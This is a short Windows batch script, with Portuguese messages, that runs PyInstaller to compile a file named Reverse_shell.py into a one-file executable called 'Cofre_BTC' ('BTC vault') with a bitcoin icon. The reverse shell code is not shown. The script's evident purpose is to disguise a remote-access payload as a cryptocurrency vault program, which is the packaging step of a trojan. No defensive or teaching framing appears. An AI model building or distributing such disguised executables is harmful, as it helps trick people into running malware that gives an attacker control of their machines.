@echo off
set "SCRIPT=Reverse_shell.py"
set "ICON=bitcoin.ico"
set "NOME_EXE=Cofre_BTC"

pyinstaller --onefile --name "%NOME_EXE%" --icon="%ICON%" "%SCRIPT%"

echo.
echo ✅ Executável criado em /dist/%NOME_EXE%.exe
pause
